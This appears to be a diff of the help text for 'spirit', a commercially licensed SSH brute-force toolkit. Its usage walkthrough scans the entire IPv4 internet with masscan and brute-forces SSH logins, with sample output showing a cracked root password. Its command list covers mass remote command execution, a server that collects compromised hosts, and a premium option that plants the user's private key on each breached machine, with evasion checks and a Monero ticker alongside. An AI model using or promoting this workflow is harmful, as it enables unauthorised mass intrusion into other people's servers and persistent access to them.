@@ -11,24 +11,25 @@ NAME:
    spirit - smart SSH brute toolkit
 
 USAGE:
-   $ ./masscan --rate="5000" --ports "22,222,2222,2212" 0.0.0.0/0 -oG open.lst
-   Scanning 357886782 hosts [4 ports/host]
+   $ masscan --rate="50000" --ports "22,222,2222,2212" 0.0.0.0/0 --exclude 255.255.255.255 -oG open.lst
+   Scanning 4294967295 hosts [4 ports/host]
    
    $ ./spirit parse open.lst
    INFO created h.lst in HOST:PORT format
    
-   $ ./spirit --jobs 600 --timeout 1s banner
+   $ ./spirit banner
    SSH-2.0-OpenSSH_8.2p  13% [=>                  ] (3686/26803) [11s:1m15s]
    INFO created b.lst in HOST:PORT:BANNER format
    
    $ mv b.lst h.lst
-   $ ./spirit --jobs 1500
+   
+   $ ./spirit
    INFO loaded h.lst with 26803 hosts
    INFO loaded p.lst with 4881 logins
    INFO estimated completion in ~1h27m36s
    root:!1qwerty 192.168.0.1:22 found [77] blocked [33] 20% [====>               ] (1567/87216) [20s:1h13m36s]
    
-   You can automate these steps with ./spirit auto
+   Tip: you can automate these steps with ./spirit auto
 
 VERSION:
    v1.7.1
@@ -38,21 +39,22 @@ AUTHORS:
    exo <exo7@protonmail.com>
 
 COMMANDS:
-   help, h  Shows a list of commands or help for one command
-   attack:
-     banner, b       extract SSH banners e.g. SSH-2.0-OpenSSH [stealth] -- (FREE)
-     auto, a         auto run [parse (open.lst), banner (h.lst), brute (h.lst, p.lst)]
-     omni, o, massh  execute commands on multiple hosts concurrently
-     swarm           [HOST:PORT] run the API Server to receive found hosts (*Under Development)
+   parse, p        [FILE] parses masscan -oG output
+   banner, b       extract SSH banners e.g. SSH-2.0-OpenSSH [stealth]
+   brute, B        performs brute-force password guessing against ssh servers
+   auto, a         auto run [parse (open.lst), banner (h.lst), brute (h.lst, p.lst)]
+   omni, o, massh  execute commands on multiple hosts concurrently
+   swarm           [HOST:PORT] run the API Server to receive found hosts (*Under Development)
+   help, h         Shows a list of commands or help for one command
    licensing:
      premium     [KEY] register Spirit Premium license
      upgrade, u  receive the latest improvements and bug fixes
    tools:
-     scan, s   [CLASS] [PORT] -- (FREE)
-     parse, p  [FILE] parses masscan -oG output -- (FREE)
-     abuse     check your host IP against abuse report databases
-     ports     [NUM] how many to random ports 1-65535 to generate (default 5)
-     coin      [ticker] default shows XMR (Monero) price chart
+     masscan, ms  ./spirit ms --country cn --ports 22,23,24 (*under development)
+     scan, s      [CLASS] [PORT]
+     ports        [NUM] how many to random ports 1-65535 to generate (default 5)
+     abuse        check your host IP against abuse report databases
+     coin         [ticker] default shows XMR (Monero) price chart
 
 GLOBAL OPTIONS:
    --addkey, -K               automatically add your private key on successful login (*Premium feature) (default: false)
